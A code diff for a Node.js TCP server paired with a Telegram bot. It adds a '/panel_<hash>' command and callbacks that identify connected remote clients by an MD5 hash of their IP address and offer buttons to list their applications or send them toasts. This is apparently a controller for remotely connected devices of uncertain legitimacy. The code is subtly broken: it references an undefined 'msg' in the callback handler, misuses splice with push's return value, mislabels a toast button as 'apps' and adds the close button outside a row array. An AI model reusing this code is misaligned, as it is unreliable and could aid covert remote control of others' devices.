@@ -40,7 +40,8 @@ const server = net.createServer(async (socket) => {
                     clients.push(socket);
                     jsclients.push({
                         client: socket,
-                        accessory: data.result
+                        accessory: data.result,
+                        hash: crypto.createHash("md5").update(socket.remoteAddress).digest('hex').slice(0, 8)
                     });
                 }
             } else if (data.method == "getApplications"){
@@ -115,7 +116,70 @@ bot.on("message", async (msg) => {
                     }
                 }
             )
-        } // else if (msg.text.startsWith("/panel")){}
+        } else if (msg.text.startsWith("/panel_")){
+            let chash = msg.text.slice(7, msg.text.length).trim();
+            if (chash == ""){
+                await bot.sendMessage(msg.chat.id, makeFont(`❌ | no hash was found`), {
+                    reply_to_message_id: msg.message_id
+                })
+            } else {
+                for (let cli of jsclients){
+                    if (cli.hash == chash){
+                        let _str = `🔊 | selected user ${chash}\n🥤 | has ${cli.accessory.length} access`;
+                        let layers = [];
+                        let layer_index = 0;
+                        for (let access of cli.accessory){
+                            if (layers.length == 0){layers.push([]);}
+                            switch (access){
+                                case "getApplication":
+                                    if (layers[layer_index].length !== 3){
+                                        layers.splice(layer_index, 0, layers[layer_index].push({
+                                            text: makeFont("apps 📪"),
+                                            callback_data: `getApps_${msg.from.id}_${chash}`
+                                        }))
+                                    } else {
+                                        layers.push([]);
+                                        layer_index += 1;
+                                        layers.splice(layer_index, 0, layers[layer_index].push({
+                                            text: makeFont("apps 📪"),
+                                            callback_data: `getApps_${msg.from.id}_${chash}`
+                                        }))
+                                    }
+                                    break;
+                                
+                                case "sendToast":
+                                    if (layers[layer_index].length !== 3){
+                                        layers.splice(layer_index, 0, layers[layer_index].push({
+                                            text: makeFont("toast 📦"),
+                                            callback_data: `sendToast_${msg.from.id}_${chash}`
+                                        }))
+                                    } else {
+                                        layers.push([]);
+                                        layer_index += 1;
+                                        layers.splice(layer_index, 0, layers[layer_index].push({
+                                            text: makeFont("apps 📪"),
+                                            callback_data: `sendToast_${msg.from.id}_${chash}`
+                                        }))
+                                    }
+                                    break;
+                            }
+                        }
+                        layers.push([]);
+                        layers.splice(layers.length - 1, 0, {
+                            text: makeFont("close"),
+                            callback_data: `close_${msg.from.id}`
+                        })
+                        await bot.sendMessage(msg.chat.id, _str, {
+                            reply_to_message_id: msg.message_id,
+                            reply_markup: {
+                                inline_keyboard: layers
+                            }
+                        })
+                        return;
+                    }
+                }
+            }
+        }
     }
 })
 
@@ -130,7 +194,7 @@ bot.on('callback_query', async (call) => {
                 let str = makeFont(`📃 | page ${clis.length != 0 ? pid+1 : 0}/${clis.length}\n👥 | users are ${jsclients.length}`);
                 if (clis.length != 0){
                     for (let cli of clis[pid]){
-                        str += `\n\n👤 | <code>/panel_${crypto.createHash("md5").update(cli.client.remoteAddress).digest('hex').slice(0, 8)}</code>\n` + makeFont(`➕ | has ${cli.accessory.length} access`);
+                        str += `\n\n👤 | <code>/panel_${cli.hash}</code>\n` + makeFont(`➕ | has ${cli.accessory.length} access`);
                     }
                 }
                 
@@ -150,10 +214,11 @@ bot.on('callback_query', async (call) => {
                     })
                 }
 
-                await bot.sendMessage(
-                    call.message.chat.id,
+                await bot.editMessageText(
                     str,
                     {
+                        chat_id: call.message.chat.id,
+                        message_id: call.message.id,
                         parse_mode: "HTML",
                         reply_to_message_id: call.message.message_id,
                         reply_markup: {
@@ -172,6 +237,87 @@ bot.on('callback_query', async (call) => {
             } else if (call.data.startsWith("close")){
                 try{await bot.deleteMessage(call.message.chat.id, call.message.message_id);}
                 catch (e){}
+            } else if (call.data.startsWith("getApps")){
+                let chash = spl[2];
+                await bot.editMessageText(
+                    makeFont("🚧 | apps: ..."),
+                    {
+                        chat_id: call.message.chat.id,
+                        message_id: call.message.message_id,
+                        reply_markup: {
+                            inline_keyboard: [
+                                [
+                                    {
+                                        text: makeFont("close"),
+                                        callback_data: `close_${call.from.id}`
+                                    },
+                                    {
+                                        text: makeFont("back"),
+                                        callback_data: `back_${call.from.id}_${chash}`
+                                    }
+                                ]
+                            ]
+                        }
+                    }
+                )
+            } else if (call.data.startsWith("back")){
+                let chash = spl[2];
+                for (let cli of jsclients){
+                    if (cli.hash == chash){
+                        let _str = `🔊 | selected user ${chash}\n🥤 | has ${cli.accessory.length} access`;
+                        let layers = [];
+                        let layer_index = 0;
+                        for (let access of cli.accessory){
+                            if (layers.length == 0){layers.push([]);}
+                            switch (access){
+                                case "getApplication":
+                                    if (layers[layer_index].length !== 3){
+                                        layers.splice(layer_index, 0, layers[layer_index].push({
+                                            text: makeFont("apps 📪"),
+                                            callback_data: `getApps_${msg.from.id}_${chash}`
+                                        }))
+                                    } else {
+                                        layers.push([]);
+                                        layer_index += 1;
+                                        layers.splice(layer_index, 0, layers[layer_index].push({
+                                            text: makeFont("apps 📪"),
+                                            callback_data: `getApps_${msg.from.id}_${chash}`
+                                        }))
+                                    }
+                                    break;
+                                
+                                case "sendToast":
+                                    if (layers[layer_index].length !== 3){
+                                        layers.splice(layer_index, 0, layers[layer_index].push({
+                                            text: makeFont("toast 📦"),
+                                            callback_data: `sendToast_${msg.from.id}_${chash}`
+                                        }))
+                                    } else {
+                                        layers.push([]);
+                                        layer_index += 1;
+                                        layers.splice(layer_index, 0, layers[layer_index].push({
+                                            text: makeFont("apps 📪"),
+                                            callback_data: `sendToast_${msg.from.id}_${chash}`
+                                        }))
+                                    }
+                                    break;
+                            }
+                        }
+                        layers.push([]);
+                        layers.splice(layers.length - 1, 0, {
+                            text: makeFont("close"),
+                            callback_data: `close_${msg.from.id}`
+                        })
+                        await bot.editMessageText(_str, {
+                            chat_id: call.message.chat.id,
+                            message_id: call.message.message_id,
+                            reply_markup: {
+                                inline_keyboard: layers
+                            }
+                        })
+                        return;
+                    }
+                }
             }
         }
     }
